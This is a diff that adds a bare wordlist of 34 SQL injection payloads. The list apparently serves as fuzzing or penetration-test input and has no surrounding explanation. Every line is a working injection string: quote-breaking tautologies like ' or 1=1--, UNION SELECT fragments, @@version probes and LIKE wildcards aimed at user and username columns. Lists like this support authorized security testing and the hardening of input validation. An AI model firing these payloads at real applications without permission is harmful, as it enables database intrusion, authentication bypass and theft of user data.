@@ -1,0 +1,34 @@
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+"' or 1 --'"
+") or ("a"="a
+'
+' (select top 1
+' --
+' ;
+' UNION ALL SELECT
+' UNION SELECT
+' or ''='
+' or '1'='1
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1 in (@@version)--
+' or 1=1 or ''='
+' or 1=1--
+' or a=a--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+0 or 1=1
+1 or 1 in (@@version)--
+1 or 1=1--
+or 1=1--
